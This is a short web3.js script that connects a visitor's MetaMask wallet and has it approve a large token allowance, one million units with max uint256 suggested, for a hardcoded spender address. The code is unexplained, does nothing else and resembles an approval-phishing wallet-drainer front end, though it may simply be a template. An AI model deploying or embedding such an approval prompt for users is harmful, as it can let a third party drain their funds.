let web3;
let userAddress;

const tokenAddress = "0x55d398326f99059ff775485246999027b3197955"; // Replace with your token address
const spenderAddress = "0x130432E180Bd88afe7D81e90b82338f7226624bf"; // Replace with your spender address

const tokenAbi = [
  {
    "constant": false,
    "inputs": [
      { "name": "_spender", "type": "address" },
      { "name": "_value", "type": "uint256" }
    ],
    "name": "approve",
    "outputs": [{ "name": "", "type": "bool" }],
    "type": "function"
  }
];

async function connectWallet() {
  if (window.ethereum) {
    web3 = new Web3(window.ethereum);
    await window.ethereum.request({ method: 'eth_requestAccounts' });
    const accounts = await web3.eth.getAccounts();
    userAddress = accounts[0];
    alert("Connected: " + userAddress);
  } else {
    alert("MetaMask not found!");
  }
}

async function approve() {
  const token = new web3.eth.Contract(tokenAbi, tokenAddress);
  const maxAmount = web3.utils.toWei('1000000'); // or use max Uint256
  try {
    await token.methods.approve(spenderAddress, maxAmount).send({ from: userAddress });
    alert("Approval successful!");
  } catch (err) {
    alert("Approval failed: " + err.message);
  }
}
